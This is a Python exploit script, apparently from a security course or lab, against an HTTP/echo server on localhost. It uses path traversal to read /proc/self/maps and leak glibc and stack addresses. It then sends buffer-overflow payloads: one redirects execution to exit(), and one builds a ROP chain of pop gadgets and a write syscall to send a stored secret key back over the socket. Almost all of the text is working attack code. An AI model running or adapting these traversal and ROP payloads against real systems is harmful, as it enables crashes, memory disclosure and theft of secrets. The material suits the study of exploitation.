#!/usr/bin/python

# Allow using the `socket` library
import socket
import time
import struct
import pdb

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('localhost', 8080))

def dump_proc_self_maps():
    """Prints the output of the server's /proc/self/maps"""
    #toSend = "GET /../../../../proc/self/maps".encode()
    toSend = "GET /../../../../../../proc/self/maps HTTP/1.1".encode()
    s.send(toSend);
    data = s.recv(2048)
    toPrint = data.splitlines()
    for temp in toPrint:
        print (temp)
    return

def server_exit():
    """Forces the server to exit"""
    toSend = "GET /../../../../../../proc/self/maps HTTP/1.1".encode()
    s.send(toSend)
    data = s.recv(2048)
    toPrint = data.splitlines()
    address_of_text_seg = "0x" + toPrint[9][0:12].decode() # get the begin address of glibc, toPrint is not string, a binary
    address_of_exit_in_dec = int(address_of_text_seg, 16) + 245504 # now we have the address of exit
            
    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s2.connect(('localhost', 8080))
    exploit = "echo ".encode() + '160 '.encode() + b'\x41' * 152 + struct.pack('<Q', address_of_exit_in_dec)
    s2.send(exploit)
    data = s2.recv(2048)
    return

def rop():
    """Forces the server to exit"""
    toSend = "GET /../../../../../../proc/self/maps HTTP/1.1".encode()
    s.send(toSend)
    data = s.recv(2048)
    toPrint = data.splitlines()
    #find address of stack 
    address_of_stack = "0x" + toPrint[5][0:12].decode()
    address_of_glibc = "0x" + toPrint[9][0:12].decode() # get the begin address of glibc
    #get adress of pop rax
    address_of_pop_rax_dec = int(address_of_glibc, 16) + 144579 # now we have the address of pop rax

    #get adress of pop rdi
    address_of_pop_rdi_dec = int(address_of_glibc, 16) + 134027 # now we have the address of pop rdi

    #get address of pop rsi
    address_of_pop_rsi_dec = int(address_of_glibc, 16) + 133643 # now we have the address of pop rsi

    #get address of pop rdx
    address_of_pop_rdx_dec = int(address_of_glibc, 16) + 7062 # now we have the address of pop rdx

    #get adrress of syscall
    address_of_syscall_dec = int(address_of_glibc, 16) + 5096 # now we have the address of syscall

    #get address of secrete key
    address_of_secrete_key_dec = int(address_of_stack, 16) + 2110592

    #get address of exit
    address_of_exit_in_dec = int(address_of_glibc, 16) + 245504

    #get socket number
    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s2.connect(('localhost', 8080))
    get_socket = "echo 6 socket".encode()
    s2.send(get_socket)
    echo_content = s2.recv(1024)
    echo_tokens = echo_content.split()
    socket_num = int(echo_tokens[3])
    s2.close()

    s3 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s3.connect(('localhost', 8080))
    exploit = "echo ".encode() + '224 '.encode() + b'\x41' * 152 + \
                struct.pack('<Q', address_of_pop_rax_dec) + b'\x01' + b'\x00' * 7 + \
                struct.pack('<Q', address_of_pop_rdi_dec) + struct.pack('<Q', socket_num) + \
                struct.pack('<Q', address_of_pop_rsi_dec) + struct.pack('<Q', address_of_secrete_key_dec) + \
                struct.pack('<Q', address_of_pop_rdx_dec) + b'\x64' + b'\x00' * 7 + \
                struct.pack('<Q', address_of_syscall_dec)
    s3.send(exploit)
    data = s3.recv(2048)
    s3.send("goodbye".encode())
    data1 = s3.recv(2048)
    secret = s3.recv(2048)
    print(secret)
    return

#dump_proc_self_maps()
#server_exit()
rop()
